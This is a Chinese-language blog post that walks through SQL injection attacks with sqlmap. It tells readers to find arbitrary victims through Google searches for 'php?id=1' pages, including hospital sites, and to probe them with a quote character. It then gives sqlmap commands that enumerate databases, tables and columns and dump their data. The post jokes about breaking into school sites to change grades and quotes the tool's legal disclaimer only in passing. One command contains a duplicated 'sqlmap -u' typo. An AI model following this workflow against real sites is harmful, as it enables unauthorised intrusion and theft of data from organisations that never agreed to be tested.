---
layout: post
title: 使用sqlmap执行SQL注入攻击
---

如果你不知道SQL注入攻击的原理是什么，看：[SQL注入攻击](http://topspeedsnail.com/hack-sql-injection-attack/)

sqlmap是开源的SQL注入自动攻击工具，它可以自动的探测SQL注入点并且进一步控制网站的数据库。

Kali Linux默认安装了这个工具。

![使用sqlmap执行SQL注入攻击]({{ site.baseurl }}/images/2016/5/Screen Shot 2016-05-08 at 18.26.46.png)

## 找到潜在的攻击目标

第一步是找到有SQL注入漏洞的网站。如果你没有特定攻击目标，可以使用[Google搜索](https://www.google.com/) php?id=1 （或php?id= ＋ xx系医院）：

找到结果中的url：

```
http://www.test.com/index.php?id=1
````

检测是否有SQL注入漏洞；在url后添加一个'符号，使用浏览器访问：

```
http://www.test.com/index.php?id=1'
````

如果网站没有SQL注入漏洞，使用上面的地址访问不会有问题。如果有SQL注入漏洞，会有错误输出：

![使用sqlmap执行SQL注入攻击]({{ site.baseurl }}/images/2016/5/Screen Shot 2016-05-08 at 15.17.44.png)

****

![使用sqlmap执行SQL注入攻击]({{ site.baseurl }}/images/2016/5/Screen Shot 2016-05-08 at 17.57.43.png)

中国很多企事业的网站都有漏洞，有很多学校网站的漏洞早已被发到了网上，这帮家伙也不修复。

入侵学校网站，修改成绩，有没有人想过:)。

关于使用sqlmap的法律问题：

> Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

## SQL注入

测试SQL注入：

{% highlight shell %}
# sqlmap -u http://www.test.com/index.php?id=1 --dbs
{% endhighlight %}

自动探测数据库类型和漏洞，如果成功会列出数据库：

![使用sqlmap执行SQL注入攻击]({{ site.baseurl }}/images/2016/5/Screen Shot 2016-05-08 at 18.58.24.png)

获得某个数据库中的表：

{% highlight shell %}
# sqlmap -u sqlmap -u http://www.test.com/index.php?id=1 --dbs -D some_db --tables
{% endhighlight %}

获得表的字段：

{% highlight shell %}
# sqlmap -u http://www.test.com/index.php?id=1 --dbs -D some_db --tables -T some_table --columns
{% endhighlight %}

下载某一字段的数据：

{% highlight shell %}
# sqlmap -u http://www.test.com/index.php?id=1 --dbs -D some_db --tables -T some_table --columns -C some_col --dump
{% endhighlight %}

更多选项，参考man手册：

{% highlight shell %}
# man sqlmap
{% endhighlight %}